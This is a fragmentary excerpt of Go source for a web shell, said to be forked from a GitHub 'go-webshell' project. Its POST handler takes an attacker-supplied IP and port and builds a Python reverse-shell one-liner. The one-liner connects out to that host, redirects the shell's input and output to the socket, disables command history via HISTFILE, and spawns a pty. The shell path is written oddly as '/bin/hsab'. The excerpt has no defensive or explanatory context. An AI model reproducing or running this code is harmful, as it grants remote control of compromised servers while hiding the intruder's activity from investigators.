// Forked from https://github.com/gb-sn/go-webshell
  ...
  <form action="/" method="POST">
    ...
    if r.Method == "POST" {
        ...
        if len(r.Form["ip"]) > 0 && len(r.Form["port"]) > 0 {
            ...
            if ver == "py" {
                payload := "python -c 'import os, pty, socket; h = \"" + ip + "\"; p = " + port + "; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((h, p)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/hsab\"); s.close();'"
                go runCmd(payload)
            }else {
